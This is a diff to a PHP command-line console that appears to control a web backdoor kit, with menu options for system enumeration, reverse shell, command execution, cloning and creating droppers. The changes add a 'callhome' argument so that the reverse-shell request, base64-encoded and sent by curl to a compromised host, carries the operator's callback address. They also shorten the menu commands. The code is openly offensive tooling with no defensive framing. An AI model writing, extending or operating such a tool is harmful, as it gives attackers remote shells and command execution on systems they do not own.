@@ -21,7 +21,7 @@ $cof = array(
 //todo need to figure out why this is no longer working on raspi
 //$success = null;
 //$te = system("bg $( which bash ) -c 'nohup proxybroker serve --host 127.0.0.1 --port 8090 --types HTTPS HTTP --lvl High &'", $success);
-is_file("sloppy_config.ini") ? define("config", parse_ini_file('sloppy_config.ini', true)) : define("config", $cof);
+is_file("includes/config/sloppy_config.ini") ? define("config", parse_ini_file('includes/config/sloppy_config.ini', true)) : define("config", $cof);
 if (empty(config['password'])) {
     define('DBCONN', sprintf("host=%s port=%s user=%s dbname=%s",
         config['host'],
@@ -117,9 +117,9 @@ function menu()
 {
     echo <<< _MENU
         (O)ptions                                                                   
-        (S)ystem enumeration                                                        
-        (R)everse shell                                                             
-        (C)ommand Execution                                                         
+        (Sys)tem enumeration                                                        
+        (Rev)erse shell                                                             
+        (Com)mand Execution                                                         
         (CL)oner
         (CR)eate Dropper                                                                  
         (U)pdates  -> not implemented yet.                                                                 
@@ -396,7 +396,7 @@ function sys($host)
     return 0;
 }
 
-function rev($host, $port, $method)
+function rev($host, $port, $method, $callhome)
 {
     $usePort = null;
     $Ushell = null;
@@ -418,8 +418,13 @@ function rev($host, $port, $method)
         } else {
             $useShell = "cmd";
         }
+        if (!empty($callhome)){
+            $callbackhome = $callhome;
+        }else{
+            $callbackhome = '';
+        }
         echo "[ ++ ] Trying: " . $axX[0] . " on " . $usePort . "[ ++ ]\n";
-        $revCommand = base64_encode($useMethod . "." . $usePort . "." . $useShell);
+        $revCommand = base64_encode($useMethod . "." . $usePort . "." . $useShell. ".". $callbackhome);
         curl_setopt(CHH, CURLOPT_URL, $axX[0] . $axX[1]);
         curl_setopt(CHH, CURLOPT_TIMEOUT, 15);
         curl_setopt(CHH, CURLOPT_CONNECTTIMEOUT, 15);
@@ -758,6 +763,12 @@ function queryDB($host, $fetchWhat)
 $run = true;
 logo($lc = null, clears, "", "", '');
 while ($run) {
+    $h = null;
+    $p = null;
+    $m = null;
+    $c = null;
+    $e = null;
+    $w = null;
     print("\n\033[33;40mPlease select your choice: \n->");
     echo("\033[0m");
     $pw = trim(fgets(STDIN));
@@ -785,7 +796,7 @@ while ($run) {
             }
             createDropper($h_name, $h_port, $d_int, $osb, $de);
             break;
-        case "s":
+        case "sys":
             system(clears);
             awesomeMenu();
             $h = readline("Which host are we checking?\n->");
@@ -795,17 +806,18 @@ while ($run) {
                 logo("s", clears, true, $e, $h);
             }
             break;
-        case "r":
+        case "rev":
             system(clears);
             awesomeMenu();
             $h = readline("Please tell me the host.(default is the host sending this request.)\n->");
             $p = readline("\nWhich port shall we use?(default is 1634)\n->");
             $m = readline("Which method is to be used?(default is bash)\n->");
+            $w = readline("Who are we connecting back to?\n(our ip/hostname)->");
             if (!empty($h)) {
-                rev($h, $p, $m);
+                rev($h, $p, $m, $w);
             }
             break;
-        case "c":
+        case "com":
             system(clears);
             try {
                 awesomeMenu();
